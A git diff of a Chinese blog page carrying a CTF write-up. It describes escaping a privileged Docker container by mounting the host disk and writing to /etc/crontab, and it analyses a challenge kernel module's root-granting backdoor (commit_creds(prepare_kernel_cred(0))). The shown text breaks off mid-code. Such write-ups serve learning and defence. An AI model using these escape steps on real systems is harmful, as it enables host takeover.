@@ -1,70 +1,231 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="" data-default-color-scheme=&#34;auto&#34;>
+
+
 
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  
-  
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content="my blogs">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
   
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <title>
-    play_with_docker |
+  <title>play_with_docker - 知世の小屋</title>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
     
-    知世の小屋</title>
+    
+      
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css">
+    
   
-  <link rel="shortcut icon" href="/favicon.ico">
+
   
-  <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-  
-  <script src="/js/pace.min.js"></script>
-</head></html>
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+</head>
+
 
 <body>
-  <main class="content">
-    <section class="outer">
-  <article id="post-play-with-docker" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
 
-  <div class="article-inner">
-    
-    <header class="article-header">
-      
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-<h1 class="article-title" itemprop="name">
-  play_with_docker
-</h1>
-
-
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2019/10/31/play-with-docker/" class="article-date">
-  <time datetime="2019-10-31T05:59:18.000Z" itemprop="datePublished">2019-10-31</time>
-</a>
-      
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    
+  </div>
+</nav>
 
-    
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="play_with_docker">
+              
+            </span>
 
-    <div class="article-entry" itemprop="articleBody">
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-10-31 13:59" pubdate="">
+        October 31, 2019 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
       
       
+      31
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
       
-      <blockquote>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">play_with_docker</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
 <p>数字云是第一次线下打real world模式,题目质量很高,深感自己所学知识的匮乏,因此特地学习了一波docker相关的知识,其实题目很简单,都怪自己太菜了走入了死胡同</p>
 </blockquote>
 <h1 id="docker在特权模式下启动的逃逸"><a href="#docker在特权模式下启动的逃逸" class="headerlink" title="docker在特权模式下启动的逃逸"></a>docker在特权模式下启动的逃逸</h1><h2 id="开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时"><a href="#开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时" class="headerlink" title="开启–privileged 的情况下(或者使用—cap-add=SYSADMIN参数启动时)"></a>开启–privileged 的情况下(或者使用—cap-add=SYSADMIN参数启动时)</h2><p>我们知道在版本6.0以后docker引入了特权模式</p>
 <p>特权模式下允许容器内的root几乎拥有外部物理机的root级别权限，而在此之前容器内root用户仅拥有外部物理机普通用户权限。</p>
 <p>因此,在开启了privileged的时候,我们就可以通过mount命令将外部宿主的磁盘挂载在容器内部,此时也就获得了宿主机的读写权限</p>
 <p>比如我们以特权模式开启一个docker,此时利用 <em>fdisk -l</em> 命令来查看磁盘文件:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ed1221982ba0:~# fdisk -l</span><br><span class="line">Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x6e32e1c3</span><br><span class="line"></span><br><span class="line">Device     Boot Start      End  Sectors Size Id Type</span><br><span class="line">/dev/sda1  *     2048 41940991 41938944  20G 83 Linux</span><br></pre></td></tr></table></figure>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs undefined">root@ed1221982ba0:~<span class="hljs-comment"># fdisk -l</span><br>Disk /dev/sda:<span class="hljs-number"> 20 </span>GiB,<span class="hljs-number"> 21474836480 </span>bytes,<span class="hljs-number"> 41943040 </span>sectors<br>Units: sectors of<span class="hljs-number"> 1 </span>*<span class="hljs-number"> 512 </span>=<span class="hljs-number"> 512 </span>bytes<br>Sector size (logical/physical):<span class="hljs-number"> 512 </span>bytes /<span class="hljs-number"> 512 </span>bytes<br>I/O size (minimum/optimal):<span class="hljs-number"> 512 </span>bytes /<span class="hljs-number"> 512 </span>bytes<br>Disklabel type: dos<br>Disk identifier: 0x6e32e1c3<br><br>Device     Boot Start      End  Sectors Size Id Type<br>/dev/sda1  *    <span class="hljs-number"> 2048 </span>41940991<span class="hljs-number"> 41938944 </span> 20G<span class="hljs-number"> 83 </span>Linux<br></code></pre></td></tr></table></figure>
 <p>此时我们就可以把sda1挂载到我们的容器内</p>
 <ol>
 <li>mkdir /xyz</li>
@@ -73,7 +234,7 @@
 <p>此时我们访问/xyz就可以访问到宿主机了,并且是拥有读写权限的,执行命令我们也可以通过写入 <em>/etc/crontab</em> 文件来执行命令(比如弹计算器QAQ)</p>
 <h1 id="数字云线下docker解法"><a href="#数字云线下docker解法" class="headerlink" title="数字云线下docker解法"></a>数字云线下docker解法</h1><p>线下的时候里一血和做不出来差了一个字符,导致这篇文章咕咕咕了很久</p>
 <p>题目要求是ssh上宿主机起的docker,然后在宿主机弹出计算器即可,给了宿主机启动docker前的的两行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo insmod /home/b/de.ko</span><br><span class="line">sudo docker run -itd --privileged -p 0.0.0.0:23:22 d77241e92fe6 /bin/bash -c &quot;/etc/init.d/ssh start;/bin/bash&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">sudo insmod /home/b/de<span class="hljs-selector-class">.ko</span><br>sudo docker run -itd --privileged -<span class="hljs-selector-tag">p</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">23</span>:<span class="hljs-number">22</span> d77241e92fe6 /bin/bash -c <span class="hljs-string">"/etc/init.d/ssh start;/bin/bash"</span><br></code></pre></td></tr></table></figure>
 <p>一种取巧的做法就是上面描述的使用特权方法,也是我线下时采用的(当时其实应该是成功了,但是环境崩了一度让我以为是我没做对</p>
 <p>尝试过的做法,</p>
 <ol>
@@ -82,166 +243,236 @@
 </ol>
 <p>这里就使用这道题的正规解法来做吧</p>
 <p>题目首先挂载了de.ko文件,然后启动了docker,那么肯定是ko文件的问题,我们拉进IDA中对文件进行分析</p>
-<h2 id="init-moudle"><a href="#init-moudle" class="headerlink" title="init_moudle"></a>init_moudle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 init_module()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rdi</span><br><span class="line">  __int64 v1; // rax</span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v0 = kmalloc_caches[4];</span><br><span class="line">  *(&amp;note + 0x100000000LL) = 0;</span><br><span class="line">  v1 = kmem_cache_alloc_trace(v0, 20971712LL, 10LL);</span><br><span class="line">  *(_BYTE *)(v1 + 8) = 1;</span><br><span class="line">  hack = v1;</span><br><span class="line">  proc_create_data(&quot;de&quot;, 438LL, 0LL, &amp;de_proc, 0LL);</span><br><span class="line">  printk(&quot;/proc/de created\n&quot;, 438LL);</span><br><span class="line">  printk(&quot;size of cred : %ld \n&quot;, 168LL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="copy-overflow"><a href="#copy-overflow" class="headerlink" title="copy_overflow"></a>copy_overflow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn copy_overflow(unsigned int a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  _warn_printk(&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;, a1, a2);</span><br><span class="line">  BUG();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="de-write"><a href="#de-write" class="headerlink" title="de_write"></a>de_write</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall de_write@&lt;rax&gt;(__int64 a1@&lt;rbx&gt;, __int64 a2@&lt;rbp&gt;, char *a3@&lt;rsi&gt;, __int64 a4@&lt;r12&gt;, __int64 a5@&lt;r13&gt;, __int64 a6@&lt;r14&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  char *v6; // rbx</span><br><span class="line">  __int64 v7; // rdx</span><br><span class="line">  __int64 v8; // r12</span><br><span class="line">  __int64 v9; // rsi</span><br><span class="line">  char v10; // al</span><br><span class="line">  __int64 v11; // rax</span><br><span class="line">  __int64 v12; // rsi</span><br><span class="line">  __int64 v14; // rax</span><br><span class="line">  unsigned int v15; // eax</span><br><span class="line">  __int64 v16; // r13</span><br><span class="line">  __int64 v17; // r13</span><br><span class="line">  const char *v18; // [rsp-40h] [rbp-40h]</span><br><span class="line">  __int64 v19; // [rsp-38h] [rbp-38h]</span><br><span class="line">  unsigned __int64 v20; // [rsp-30h] [rbp-30h]</span><br><span class="line">  __int64 v21; // [rsp-28h] [rbp-28h]</span><br><span class="line">  __int64 v22; // [rsp-20h] [rbp-20h]</span><br><span class="line">  __int64 v23; // [rsp-18h] [rbp-18h]</span><br><span class="line">  __int64 v24; // [rsp-10h] [rbp-10h]</span><br><span class="line">  __int64 v25; // [rsp-8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v25 = a2;</span><br><span class="line">  v24 = a6;</span><br><span class="line">  v23 = a5;</span><br><span class="line">  v22 = a4;</span><br><span class="line">  v21 = a1;</span><br><span class="line">  v6 = a3;</span><br><span class="line">  v8 = v7;</span><br><span class="line">  v20 = __readgsqword(0x28u);</span><br><span class="line">  mutex_lock(&amp;lock);</span><br><span class="line">  v9 = (unsigned __int8)*a3;</span><br><span class="line">  printk(&quot;order:%d&quot;, v9);</span><br><span class="line">  v10 = *v6;</span><br><span class="line">  if ( *v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v10 == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&quot;note write\n&quot;, v9);</span><br><span class="line">      v17 = *((_QWORD *)&amp;note + 1);</span><br><span class="line">      _check_object_size(*((_QWORD *)&amp;note + 1), v8 - 1, 0LL);</span><br><span class="line">      copy_from_user(v17, v6 + 1, v8 - 1);</span><br><span class="line">      printk(&quot;write contents compelete\n&quot;, v6 + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v10 == -2 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&quot;note write magic %ld\n&quot;, v8);</span><br><span class="line">      v16 = hack;</span><br><span class="line">      _check_object_size(hack, v8 - 1, 0LL);</span><br><span class="line">      copy_from_user(v16, v6 + 1, v8 - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v10 != -3 || *(_BYTE *)(hack + 8) )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&quot;note malloc\n&quot;, v9);</span><br><span class="line">      note = *v6;</span><br><span class="line">      printk(&quot;write size compelete\n&quot;, v9);</span><br><span class="line">      v11 = _kmalloc((unsigned __int8)note, 20971712LL);</span><br><span class="line">      v12 = (unsigned __int8)note;</span><br><span class="line">      *((_QWORD *)&amp;note + 1) = v11;</span><br><span class="line">      printk(&quot;malloc size compelete:%d @ %p\n&quot;, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = prepare_kernel_cred(0LL);</span><br><span class="line">      commit_creds(v14);</span><br><span class="line">      v18 = &quot;/usr/bin/gnome-calculator&quot;;</span><br><span class="line">      v19 = 0LL;</span><br><span class="line">      v15 = call_usermodehelper(&quot;/usr/bin/gnome-calculator&quot;, &amp;v18, envp_26376, 1LL);</span><br><span class="line">      printk(&quot;RC is: %i \n&quot;, v15);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&quot;note free\n&quot;, v9);</span><br><span class="line">    kfree(*((_QWORD *)&amp;note + 1));</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_unlock(&amp;lock);</span><br><span class="line">  return v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="de-read"><a href="#de-read" class="headerlink" title="de_read"></a>de_read</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall de_read(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // rdx</span><br><span class="line">  unsigned __int64 v3; // r12</span><br><span class="line">  unsigned __int64 v4; // rbx</span><br><span class="line">  __int64 v5; // r12</span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v3 = v2;</span><br><span class="line">  mutex_lock(&amp;lock);</span><br><span class="line">  printk(&quot;/proc/de read\n&quot;, a2);</span><br><span class="line">  v4 = (unsigned __int8)note;</span><br><span class="line">  if ( (unsigned __int8)note &gt; v3 )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = *((_QWORD *)&amp;note + 1);</span><br><span class="line">  _check_object_size(*((_QWORD *)&amp;note + 1), v4, 1LL);</span><br><span class="line">  copy_to_user(a2, v5, v4);</span><br><span class="line">  mutex_unlock(&amp;lock);</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们可以看到我们只需要紧盯de_write函数即可,我们只需要让程序跳转到这里就可以调用后门来弹出计算器了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v14 = prepare_kernel_cred(0LL);</span><br><span class="line">commit_creds(v14);</span><br><span class="line">v18 = &quot;/usr/bin/gnome-calculator&quot;;</span><br><span class="line">v19 = 0LL;</span><br><span class="line">v15 = call_usermodehelper(&quot;/usr/bin/gnome-calculator&quot;, &amp;v18, envp_26376, 1LL);</span><br><span class="line">printk(&quot;RC is: %i \n&quot;, v15);</span><br></pre></td></tr></table></figure></p>
-<p>我们知道在内核中想要获得root权限不能只是用system(“/bin/sh”);而是用下面的语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred (0));</span><br></pre></td></tr></table></figure></p>
+<h2 id="init-moudle"><a href="#init-moudle" class="headerlink" title="init_moudle"></a>init_moudle</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs undefined">__int64 init_module()<br>&#123;<br>  __int64 <span class="hljs-built_in">v0</span><span class="hljs-comment">; // rdi</span><br>  __int64 <span class="hljs-built_in">v1</span><span class="hljs-comment">; // rax</span><br><br>  _fentry__()<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v0</span> = kmalloc_caches[<span class="hljs-number">4</span>]<span class="hljs-comment">;</span><br>  *(&amp;note + <span class="hljs-number">0x100000000</span>LL) = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v1</span> = kmem_cache_alloc_trace(<span class="hljs-built_in">v0</span>, <span class="hljs-number">20971712</span>LL, <span class="hljs-number">10</span>LL)<span class="hljs-comment">;</span><br>  *(_BYTE *)(<span class="hljs-built_in">v1</span> + <span class="hljs-number">8</span>) = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  hack = <span class="hljs-built_in">v1</span><span class="hljs-comment">;</span><br>  proc_create_data(<span class="hljs-string">"de"</span>, <span class="hljs-number">438</span>LL, <span class="hljs-number">0</span>LL, &amp;de_proc, <span class="hljs-number">0</span>LL)<span class="hljs-comment">;</span><br>  printk(<span class="hljs-string">"/proc/de created\n"</span>, <span class="hljs-number">438</span>LL)<span class="hljs-comment">;</span><br>  printk(<span class="hljs-string">"size of cred : %ld \n"</span>, <span class="hljs-number">168</span>LL)<span class="hljs-comment">;</span><br>  return <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="copy-overflow"><a href="#copy-overflow" class="headerlink" title="copy_overflow"></a>copy_overflow</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined">void __fastcall __noreturn copy_overflow(unsigned int <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>&#123;<br>  _warn_printk(<span class="hljs-string">"Buffer overflow detected (%d &lt; %lu)!\n"</span>, <span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-keyword">BUG();<br></span>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="de-write"><a href="#de-write" class="headerlink" title="de_write"></a>de_write</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs undefined">__int64 __usercall de_write@&lt;rax&gt;(__int64 <span class="hljs-built_in">a1</span>@&lt;rbx&gt;, __int64 <span class="hljs-built_in">a2</span>@&lt;rbp&gt;, char *<span class="hljs-built_in">a3</span>@&lt;rsi&gt;, __int64 <span class="hljs-built_in">a4</span>@&lt;r12&gt;, __int64 <span class="hljs-built_in">a5</span>@&lt;r13&gt;, __int64 <span class="hljs-built_in">a6</span>@&lt;r14&gt;)<br>&#123;<br>  char *v6<span class="hljs-comment">; // rbx</span><br>  __int64 v7<span class="hljs-comment">; // rdx</span><br>  __int64 v8<span class="hljs-comment">; // r12</span><br>  __int64 v9<span class="hljs-comment">; // rsi</span><br>  char v10<span class="hljs-comment">; // al</span><br>  __int64 v11<span class="hljs-comment">; // rax</span><br>  __int64 v12<span class="hljs-comment">; // rsi</span><br>  __int64 v14<span class="hljs-comment">; // rax</span><br>  unsigned int v15<span class="hljs-comment">; // eax</span><br>  __int64 v16<span class="hljs-comment">; // r13</span><br>  __int64 v17<span class="hljs-comment">; // r13</span><br>  const char *v18<span class="hljs-comment">; // [rsp-40h] [rbp-40h]</span><br>  __int64 v19<span class="hljs-comment">; // [rsp-38h] [rbp-38h]</span><br>  unsigned __int64 v20<span class="hljs-comment">; // [rsp-30h] [rbp-30h]</span><br>  __int64 v21<span class="hljs-comment">; // [rsp-28h] [rbp-28h]</span><br>  __int64 v22<span class="hljs-comment">; // [rsp-20h] [rbp-20h]</span><br>  __int64 v23<span class="hljs-comment">; // [rsp-18h] [rbp-18h]</span><br>  __int64 v24<span class="hljs-comment">; // [rsp-10h] [rbp-10h]</span><br>  __int64 v25<span class="hljs-comment">; // [rsp-8h] [rbp-8h]</span><br><br>  _fentry__()<span class="hljs-comment">;</span><br>  v25 = <span class="hljs-built_in">a2</span><span class="hljs-comment">;</span><br>  v24 = <span class="hljs-built_in">a6</span><span class="hljs-comment">;</span><br>  v23 = <span class="hljs-built_in">a5</span><span class="hljs-comment">;</span><br>  v22 = <span class="hljs-built_in">a4</span><span class="hljs-comment">;</span><br>  v21 = <span class="hljs-built_in">a1</span><span 